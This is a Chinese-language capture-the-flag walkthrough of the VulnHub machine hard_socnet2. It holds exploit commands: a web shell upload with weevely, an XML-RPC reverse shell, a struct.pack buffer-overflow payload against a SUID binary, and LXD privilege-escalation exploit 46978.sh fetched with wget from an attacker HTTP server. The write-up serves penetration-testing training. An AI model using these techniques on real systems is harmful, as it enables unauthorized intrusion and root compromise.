靶机介绍：hard_socnet2

靶机地址: https://download.vulnhub.com/boredhackerblog/hard_socnet2.ova

靶机难度：高

打靶目标: 取得 root 权限

主机发现

端口扫描

访问对应端口服务

80端口需要登录用户

8000端口——没有明显漏洞

尝试使用burpsuite修改请求方法——发现都无法访问

注册用户登录

登录进去后发现有一个监视服务器程序，发现两个用户admin与test user

发现上传点

尝试上传木马文件

访问木马地址

使用weevely工具链接木马

提权

本次提权将展示三种提权方法，所有方法的前提都要成功上传木马

第一种方法

查看当前服务器用户

发现可登录用户socnet,查看该用户目录下的文件，发现之前提到的monitor.py监视服务器文件

检测一下该程序是否在运行

查看该程序代码

该代码的作用：xml-rpc在服务器端中生成一个API接口，这样服务端就可以接受来自装有xml-rpc客户端的请求方式，来提供应用交互。

客户端代码

详细使用介绍xmlrpc — XMLRPC 服务端与客户端模块 — Python 3.11.5 文档

编写客户端代码链接服务端
  • 由于之前服务端调用了一个随机数，所以我们需要爆破出这个随机数

运行该代码

成功获取到带随机数并成功返回id命令

使用客户端带命令反弹shell

使用该命令使他交互更加友好python -c "import pty; pty.spawn('/bin/bash')"

查看该用户家目录文件

经过检测发现add_record是可执行程序，并且该程序有suid权限与sgid权限位，那应该就是对该程序下手

程序检测

简单运行该程序

缓冲区溢出漏洞

使用gdb动态调试，提交大量数据进行测试，发现在反馈中发现缓冲区溢出漏洞

生成100个A进行测试python3 -c "print('A'*100)"

生成100个不同的字符串再次提交pattern create 100

定位溢出位置pattern search

查看EIP的偏移量位62，说明第63个字符出现了溢出

验证测试

BACE成功加载到EIP中

加载主程序disas main

分析

断点分析break *0x0804873d

输入s进行单步调试

发现返回欢迎信息

删除该断点继续添加新的断点调试

  • 删除第一个断点del 1

添加新断点继续调试

发现该函数是输出Years worked(int):信息

通过不断调试发现一个用户自定义函数vuln没有携带@plt

验证是不是自定义函数

输入info func查看所有函数

发现了setuid@plt,说明有些程序调用的suid这个函数，system@plt,说明该有程序执行了操作系统指令，发现backdoor（后门）

发现了两个自定义函数，我们去查看这两个函数做了什么事

disas vuln

发现他调用了一个strcpy@plt的函数

disas backdoor

该函数调用申请了suid权限，并调用了system函数准备执行系统命令

  • 分析到这里，我们已经想好了具体的思路：vuln必定会执行，而且vuln存在有缓冲区漏洞的内件（strcpy），主函数没有直接调用backdoor，，所以利用这个缓冲区溢出漏洞，向EIP寄存器里写入backdoor函数的起始内存加载地址。。从而通过漏洞执行backdoor函数，利用backdoor会调用setuid以及system，；进而执行system函数的操作系统的命令。

地址问题：在发现EIP中的内存地址是ASCII编码，但是它是倒着写的，所以我们构造的代码也需要倒着写

找到backdoor的内存起始地址

在靶机使用python -c "import struct; print('abc\n2\n3\n1\n' + 'A'*62 + struct.pack('I', 0x08048676))" >payload命令生成payload

重新进入gdb调试后输入r < payload

发现它新建了几个新的进程，并执行了/bin/bash /bin/dash

利用payload漏洞

cat payload -| ./add_record

第二种方法

前提条件成功使用python客户端获取到socnet用户

通过id命令查看该用户

使用uname -a 查看系统内核

使用searchsploit Ubuntu 18.04查找可用内核漏洞

把该脚本复制到桌面 cp /usr/share/exploitdb/exploits/linux/local/46978.sh ./

查看该脚本cat 46978.sh

按照文档说明进行使用

  1. wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine下载文件到kali主机
  2. root权限运行./build-alpine该文件,上传到目标服务器

使用python -m http.server 80开启web服务

在靶机使用wget http://192.168.146.7/46978.sh和wget http://192.168.146.7/123.tar.gz(123.tar.gz就是root权限运行后的文件)

  1. 赋予执行权限chmod a+x 46978.sh
  2. 使用该命令执行./46978.sh -f 123.tar.gz
